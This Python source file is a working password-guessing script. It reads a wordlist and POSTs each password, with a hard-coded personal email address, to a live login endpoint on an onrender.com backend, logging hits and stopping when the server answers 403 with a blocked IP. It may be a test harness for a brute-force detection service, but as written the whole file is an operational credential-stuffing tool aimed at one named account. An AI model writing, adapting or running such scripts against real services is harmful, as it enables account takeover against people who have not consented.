import socket
import requests
from functions.log import forbidden_log, rich_log

# =============================================================== 
# ================== store passwords in buffer ================== 
# =============================================================== 
passwords: list[str] = []

def save_pass_buffer():    
    with open("password_list/passwords.txt", "r", encoding="utf-8", errors="replace") as f:
        data = f.readlines()
        passwords.extend(data)

# ===============================================================
# ================== start the requests ========================= 
# ===============================================================

# api endpoint
URL = "https://bfds-backend.onrender.com/login/"

HEADERS = {
  'Content-Type': 'application/x-www-form-urlencoded',
}

def send_login_request(*, email: str):
    for password_buffer in passwords:
        password = password_buffer.strip()

        PAYLOAD = f'email={email}&password={password}'
        PAYLOAD = PAYLOAD.replace("@", "%40")

        response = requests.request("POST", URL, headers=HEADERS, data=PAYLOAD)
        if response.status_code == 200:
            rich_log(email, password, ok=True)
            break
        elif response.status_code == 403:
            try:
                ip = response.json().get("ip")
            except Exception:
                ip = None
            forbidden_log(ip=ip)
            break
        else:
            rich_log(email, password, ok=False)


def start(*, email: str):
    save_pass_buffer()
    send_login_request(email=email)


if __name__ == "__main__":
    start(email="ram19870101@gmail.com")



